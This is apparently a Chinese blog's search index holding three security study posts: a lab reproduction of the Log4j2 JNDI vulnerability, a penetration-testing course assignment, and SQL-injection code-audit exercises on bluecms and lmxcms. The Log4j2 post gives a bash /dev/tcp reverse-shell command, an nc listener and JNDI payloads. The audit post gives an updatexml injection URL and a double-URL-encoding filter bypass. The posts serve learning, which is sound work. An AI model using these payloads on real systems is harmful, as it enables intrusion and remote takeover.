<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>经典漏洞复现</title>
    <link href="/2023/12/05/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/12/05/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="经典漏洞复现"><a href="#经典漏洞复现" class="headerlink" title="经典漏洞复现"></a>经典漏洞复现</h1><p>本次文章旨在应用对漏洞原理日后有时间再做深究</p><h2 id="Log4j2远程命令执行（CVE-2021-44228）"><a href="#Log4j2远程命令执行（CVE-2021-44228）" class="headerlink" title="Log4j2远程命令执行（CVE-2021-44228）"></a>Log4j2远程命令执行（CVE-2021-44228）</h2><h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>推荐使用bp的一个插件Log4j2Scan</p><p>项目地址:<a href="https://github.com/whwlsfb/Log4j2Scan">https://github.com/whwlsfb/Log4j2Scan</a></p><p><img src="/image/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1701778718355.png" alt="1701778718355"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>通过bp插件发现漏洞点在<a href="http://192.168.10.120:58051/hello?payload=111%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2%EF%BC%8C%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2%E6%9C%89%E5%BE%88%E5%A4%9A%E8%A7%A6%E5%8F%91%E7%82%B9%E8%BF%99%E9%87%8C%E7%94%A8%E7%9A%84%E6%98%AF?payload=%E8%BF%99%E4%B8%AA%E4%BC%A0%E5%8F%82%E7%82%B9">http://192.168.10.120:58051/hello?payload=111这个页面，这个页面有很多触发点这里用的是?payload=这个传参点</a></p><p><img src="/image/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1701787019035.png" alt="1701787019035"></p><p>首先用dnslog手动验证一下pyload:<code>$&#123;jndi:ldap://dnslog.cn&#125; </code></p><p>get传参还要进行url编码</p><p><img src="/image/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1701787484971.png" alt="1701787484971"></p><p><img src="/image/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1701787513433.png" alt="1701787513433"></p><p>成功验证传参点现在来到漏洞利用阶段尝试反弹shell</p><p>因为我是在内网搭的环境可以使用本机验证如果在公网的环境可以用自己的vps</p><p>首先用nc 监听一个端口 <code>nc -lvvp 端口</code></p><p><img src="/image/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1701788057653.png" alt="1701788057653"></p><p>然后要用到一个JNDI注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>先将这个命令输进行base64编码 <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p><p><img src="/image/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1701788935898.png" alt="1701788935898"></p><p>然后将编码后的数据放在这个命令中 <code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar  -C bash -c &quot;&#123;echo,base64编码命令&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  -A   [vps ip] </code></p><p><img src="/image/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1701796377046.png" alt="1701796377046"></p><p>我这里选择用第五个rmi:&#x2F;&#x2F;192.168.10.72:1099&#x2F;tmtrzz</p><p>构造命令 <code>$&#123;jndi:rmi://192.168.10.72:1099/tmtrzz &#125;</code></p><p>进行url编码传参</p><p><img src="/image/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1701796522919.png" alt="1701796522919"></p><p>报错</p><p><img src="/image/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1701796492789.png" alt="1701796492789"></p><p>发现是java版本太高将版本改到java8成功反弹shell</p><p><img src="/image/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1701796802191.png" alt="1701796802191"></p><p><img src="/image/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1701796867864.png" alt="1701796867864"></p><h2 id="Fastjson反序列化漏洞"><a href="#Fastjson反序列化漏洞" class="headerlink" title="Fastjson反序列化漏洞"></a>Fastjson反序列化漏洞</h2><h3 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>通过bp插件</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试课程作业</title>
    <link href="/2023/11/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A1/"/>
    <url>/2023/11/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A1/</url>
    
    <content type="html"><![CDATA[<p>任务<br>1、Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？<br>2、Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？<br>3、对于1、2的结果，进行总结分析。<br>注：网络配置发生变化，建议重启网卡（操作命令见PPT）</p><h1 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h1><p>当前虚拟机使用了桥接模式，即虚拟机作为局域网中的一个独立主机，在物理机连接GUET_WIFI的情况下，使用ifconfig命令查看<br><img src="/img/image-2.png"><br>无法查看ip地址，应该是校园网原因</p><h1 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h1><p>当前虚拟机使用了桥接模式，即虚拟机作为局域网中的一个独立主机，在物理机连接手机热点的情况下，使用ifconfig命令查看<br><img src="/img/image-4.png"><br>可以获得ip地址</p><h1 id="任务三"><a href="#任务三" class="headerlink" title="任务三"></a>任务三</h1><p>连接校园网无法获得ip地址应该是校园网配置问题而热点可以获得ip</p><h3 id="作业3"><a href="#作业3" class="headerlink" title="作业3"></a>作业3</h3><p>与ZoomEye功能类似的搜索引擎还有哪些？</p><p>fofa 鹰图等</p><p>利用ZoomEye进行相关搜索，截图</p><p><img src="/image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A1/1702034040278.png" alt="1702034040278"></p><p>子域名收集，截图。</p><p><img src="/image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A1/1702034123149.png" alt="1702034123149"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码审计练习之sql注入</title>
    <link href="/2023/09/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/09/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>暑假简单的学了一下代码审计，整几个简单的cms来练习</p><hr><h1 id="一、sql注入一般审计方法"><a href="#一、sql注入一般审计方法" class="headerlink" title="一、sql注入一般审计方法"></a>一、sql注入一般审计方法</h1><p>1.数据库监控<br>    通过黑盒功能点测试，查看sql语句，在通过SQL语句关键字进行代码审计<br>2.关键函数审计<br> 通过审计关键函数的代码来审计漏洞<br>  正则表达式 :(update|select|insert|delete|).<em>?where.</em>&#x3D;<br>  静态代码自动审计</p><h1 id="二、审计练习"><a href="#二、审计练习" class="headerlink" title="二、审计练习"></a>二、审计练习</h1><h2 id="1-bluecms（无过滤）"><a href="#1-bluecms（无过滤）" class="headerlink" title="1.bluecms（无过滤）"></a>1.bluecms（无过滤）</h2><p>使用正则表达式：(update|select|insert|delete|).<em>?where.</em>&#x3D;</p><p><img src="/img/image.png"><br>选择ad_js.php</p><p>代码如下（示例）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [bluecms]��Ȩ���� ��׼���磬��������Ȩ��</span><br><span class="hljs-comment"> * This is not a freeware, use is subject to license terms</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * $Id��ad_js.php</span><br><span class="hljs-comment"> * $author��lucks</span><br><span class="hljs-comment"> */</span><br>define(<span class="hljs-string">&#x27;IN_BLUE&#x27;</span>, <span class="hljs-literal">true</span>);<br>require_once <span class="hljs-title function_">dirname</span><span class="hljs-params">(__FILE__)</span> . &#x27;/include/common.inc.php&#x27;;<br><br>$ad_id = !empty($_GET[<span class="hljs-string">&#x27;ad_id&#x27;</span>]) ? trim($_GET[<span class="hljs-string">&#x27;ad_id&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;;</span><br><span class="hljs-string">if(empty($ad_id))</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">echo &#x27;</span>Error!<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">exit();</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#x27;</span>ad<span class="hljs-number">&#x27;</span>).<span class="hljs-string">&quot; WHERE ad_id =&quot;</span>.$ad_id);<br><span class="hljs-keyword">if</span>($ad[<span class="hljs-string">&#x27;time_set&#x27;</span>] == <span class="hljs-number">0</span>)<br>&#123;<br>$ad_content = $ad[<span class="hljs-string">&#x27;content&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">if</span>($ad[<span class="hljs-string">&#x27;end_time&#x27;</span>] &lt; time())<br>&#123;<br>$ad_content = $ad[<span class="hljs-string">&#x27;exp_content&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>$ad_content = $ad[<span class="hljs-string">&#x27;content&#x27;</span>];<br>&#125;<br>&#125;<br>$ad_content = str_replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>,$ad_content);<br>$ad_content = str_replace(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\\r&quot;</span>,$ad_content);<br>$ad_content = str_replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\\n&quot;</span>,$ad_content);<br>echo <span class="hljs-string">&quot;&lt;!--\r\ndocument.write(\&quot;&quot;</span>.$ad_content.<span class="hljs-string">&quot;\&quot;);\r\n--&gt;\r\n&quot;</span>;<br><br>?&gt;<br><br><br></code></pre></td></tr></table></figure><p>发现通过get方式接受ad_id变量没有任何过滤拼接到sql语句并执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">$ad_id = !empty($_GET[<span class="hljs-string">&#x27;ad_id&#x27;</span>]) ? trim($_GET[<span class="hljs-string">&#x27;ad_id&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;;</span><br><span class="hljs-string">if(empty($ad_id))</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">echo &#x27;</span>Error!<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">exit();</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#x27;</span>ad<span class="hljs-number">&#x27;</span>).<span class="hljs-string">&quot; WHERE ad_id =&quot;</span>.$ad_id);<br></code></pre></td></tr></table></figure><p>定位getone函数，直接执行了语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">getone</span><span class="hljs-params">($sql, $type=MYSQL_ASSOC)</span>&#123;<br>    $query = $this-&gt;query($sql,$this-&gt;linkid);<br>    $row = mysql_fetch_array($query, $type);<br>    <span class="hljs-keyword">return</span> $row;<br>    &#125;<br>    <br></code></pre></td></tr></table></figure><h2 id="2-lmxcms-1-4（无过滤）mvc架构-cnvd"><a href="#2-lmxcms-1-4（无过滤）mvc架构-cnvd" class="headerlink" title="2.lmxcms 1.4（无过滤）mvc架构 cnvd"></a>2.lmxcms 1.4（无过滤）mvc架构 cnvd</h2><p>从cnvd发现梦想CMS后台存在SQL注入，知道Bo、cl开头的文件</p><p><img src="/img/image-1.png"></p><p>从描述知道是后台sql注入判断在c&#x2F;admin&#x2F; 文件夹找Bo开头文件<br>在文件发现只有reply函数有变量传参操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"> public function <span class="hljs-title function_">reply</span><span class="hljs-params">()</span>&#123;<br>        $id = $_GET[<span class="hljs-string">&#x27;id&#x27;</span>] ? $_GET[<span class="hljs-string">&#x27;id&#x27;</span>] : $_POST[<span class="hljs-string">&#x27;id&#x27;</span>];<br>        <span class="hljs-comment">//获取回复数据</span><br>        $reply = $this-&gt;bookModel-&gt;getReply(<span class="hljs-built_in">array</span>($id));<br>        <span class="hljs-keyword">if</span>($reply)&#123;<br>            $reply = <span class="hljs-built_in">string</span>::html_char($reply[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;content&#x27;</span>]);<br>            $this-&gt;smarty-&gt;assign(<span class="hljs-string">&#x27;content&#x27;</span>,$reply);<br>            $this-&gt;smarty-&gt;assign(<span class="hljs-string">&#x27;type&#x27;</span>,<span class="hljs-string">&#x27;update&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            $this-&gt;smarty-&gt;assign(<span class="hljs-string">&#x27;type&#x27;</span>,<span class="hljs-string">&#x27;add&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(isset($_POST[<span class="hljs-string">&#x27;reply&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(!$_POST[<span class="hljs-string">&#x27;content&#x27;</span>])&#123;<br>                rewrite::js_back(<span class="hljs-string">&#x27;回复内容不能为空&#x27;</span>);<br>            &#125;<br>            $this-&gt;bookModel-&gt;reply(<span class="hljs-built_in">array</span>(<span class="hljs-string">&#x27;id&#x27;</span>=&gt;$id,<span class="hljs-string">&#x27;type&#x27;</span>=&gt;$_POST[<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-string">&#x27;username&#x27;</span>=&gt;$this-&gt;username));<br>            addlog(<span class="hljs-string">&#x27;留言回复【id：&#x27;</span>.$_POST[<span class="hljs-string">&#x27;id&#x27;</span>]<span class="hljs-number">.&#x27;</span>】<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">            rewrite::succ(&#x27;</span>修改成功<span class="hljs-string">&#x27;,&#x27;</span>?m=Book<span class="hljs-number">&#x27;</span>);<br>        &#125;<br>        $this-&gt;smarty-&gt;assign(<span class="hljs-string">&#x27;id&#x27;</span>,$id);<br>        $this-&gt;smarty-&gt;display(<span class="hljs-string">&#x27;Book/reply.html&#x27;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>   发现通过get或post对id传参到getReply函数，定位getReply函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">public function <span class="hljs-title function_">getReply</span><span class="hljs-params">(<span class="hljs-built_in">array</span> $id)</span>&#123;<br>       $id = implode(<span class="hljs-string">&#x27;,&#x27;</span>,$id);<br>       $param[<span class="hljs-string">&#x27;where&#x27;</span>] = <span class="hljs-string">&#x27;uid in(&#x27;</span>.$id<span class="hljs-number">.&#x27;</span>)<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">       return parent::selectModel($param);</span><br><span class="hljs-string">   &#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>   继续定位selectModel函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">protected function <span class="hljs-title function_">selectModel</span><span class="hljs-params">($param=<span class="hljs-built_in">array</span>())</span>&#123;<br>      <span class="hljs-keyword">if</span>($param[<span class="hljs-string">&#x27;field&#x27;</span>])&#123;<br>          $this-&gt;field=$param[<span class="hljs-string">&#x27;field&#x27;</span>];<br>      &#125;<br>      <span class="hljs-keyword">return</span> parent::selectDB($this-&gt;tab[<span class="hljs-string">&#x27;0&#x27;</span>],$this-&gt;field,$param);<br>   &#125;<br><br></code></pre></td></tr></table></figure><p>   继续定位selectDB<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">protected function <span class="hljs-title function_">selectDB</span><span class="hljs-params">($tab,Array $field,$param=<span class="hljs-built_in">array</span>())</span>&#123;<br>       $arr = <span class="hljs-built_in">array</span>();<br>       $field = implode(<span class="hljs-string">&#x27;,&#x27;</span>,$field);<br>       $force = <span class="hljs-string">&#x27;&#x27;;</span><br><span class="hljs-string">       //强制进入某个索引</span><br><span class="hljs-string">       if($param[&#x27;</span>force<span class="hljs-number">&#x27;</span>]) $force = <span class="hljs-string">&#x27; force index(&#x27;</span>.$param[<span class="hljs-string">&#x27;force&#x27;</span>]<span class="hljs-number">.&#x27;</span>)<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">       if($param[&#x27;</span>ignore<span class="hljs-number">&#x27;</span>]) $force = <span class="hljs-string">&#x27; ignore index(&#x27;</span>.$param[<span class="hljs-string">&#x27;ignore&#x27;</span>]<span class="hljs-number">.&#x27;</span>)<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">       $sqlStr = $this-&gt;where($param);</span><br><span class="hljs-string">       $sql=&quot;SELECT $field FROM &quot;.DB_PRE.&quot;$tab$force $sqlStr&quot;;</span><br><span class="hljs-string">       $result=$this-&gt;query($sql);</span><br><span class="hljs-string">       while(!!$a=mysql_fetch_assoc($result))&#123;</span><br><span class="hljs-string">           $arr[]=$a;</span><br><span class="hljs-string">       &#125;</span><br><span class="hljs-string">       $this-&gt;result($result);</span><br><span class="hljs-string">       return $arr;</span><br><span class="hljs-string">   &#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><br>   发现变量$sqlStr拼接在sql语句并执行</p><p>构造报错注入paylad:<a href="http://127.0.0.1/lmxcms1.4/admin.php?m=book&a=reply&id=1)%20">http://127.0.0.1/lmxcms1.4/admin.php?m=book&amp;a=reply&amp;id=1)%20</a><br>and%20updatexml(0,concat(0x7e,user()),1)%23<br>因为是mvc架构m是功能也就是文件名a是函数在拼接参数</p><h2 id="2-LmxCMS-V1-4-前台-Ta-cl-php-存在-SQL-注入漏洞（有过滤）mvc架构"><a href="#2-LmxCMS-V1-4-前台-Ta-cl-php-存在-SQL-注入漏洞（有过滤）mvc架构" class="headerlink" title="2.LmxCMS V1.4 前台 Ta***.cl***.php 存在 SQL 注入漏洞（有过滤）mvc架构"></a>2.LmxCMS V1.4 前台 Ta***.cl***.php 存在 SQL 注入漏洞（有过滤）mvc架构</h2><p>查找ta开头文件，观察发现data变量经过p函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">public function __construct() &#123;<br>        parent::__construct();<br>        $data = p(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>        $name = <span class="hljs-built_in">string</span>::delHtml($data[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-keyword">if</span>(!$name) _404();<br>        $name = urldecode($name);<br>        <span class="hljs-keyword">if</span>($this-&gt;tagsModel == null) $this-&gt;tagsModel = new TagsModel();<br>        $this-&gt;data = $this-&gt;tagsModel-&gt;getNameData($name);<br>        <span class="hljs-keyword">if</span>(!$this-&gt;data) _404();<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>定义p函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">p</span><span class="hljs-params">($type=<span class="hljs-number">1</span>,$pe=<span class="hljs-literal">false</span>,$sql=<span class="hljs-literal">false</span>,$mysql=<span class="hljs-literal">false</span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>($type == <span class="hljs-number">1</span>)&#123;<br>        $data = $_POST;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($type == <span class="hljs-number">2</span>)&#123;<br>        $data = $_GET;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        $data = $type;<br>    &#125;<br>    <span class="hljs-keyword">if</span>($sql) filter_sql($data);<br>    <span class="hljs-keyword">if</span>($mysql) mysql_retain($data);<br>    foreach($data as $k =&gt; $v)&#123;<br>        <span class="hljs-keyword">if</span>(is_array($v))&#123;<br>            $newdata[$k] = p($v,$pe,$sql,$mysql);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span>($pe)&#123;<br>                $newdata[$k] = <span class="hljs-built_in">string</span>::addslashes($v);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                $newdata[$k] = trim($v);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> $newdata;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>发现有启用了过滤函数filter_sql和转义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">filter_sql</span><span class="hljs-params">(<span class="hljs-built_in">array</span> $data)</span>&#123;<br>    foreach($data as $v)&#123;<br>        <span class="hljs-keyword">if</span>(is_array($v))&#123;<br>            filter_sql($v);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">//转换小写</span><br>            $v = strtolower($v);<br>            <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/count|create|delete|select|update|use|drop|insert|info|from/&#x27;</span>,$v))&#123;<br>                rewrite::js_back(<span class="hljs-string">&#x27;【&#x27;</span>.$v<span class="hljs-number">.&#x27;</span>】数据非法<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>   观察开头函数发现有<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">$name = urldecode($name);<br><br></code></pre></td></tr></table></figure><br>   可以通过两次url编码绕过过滤将注入语句代入getNameData函数进行注入</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
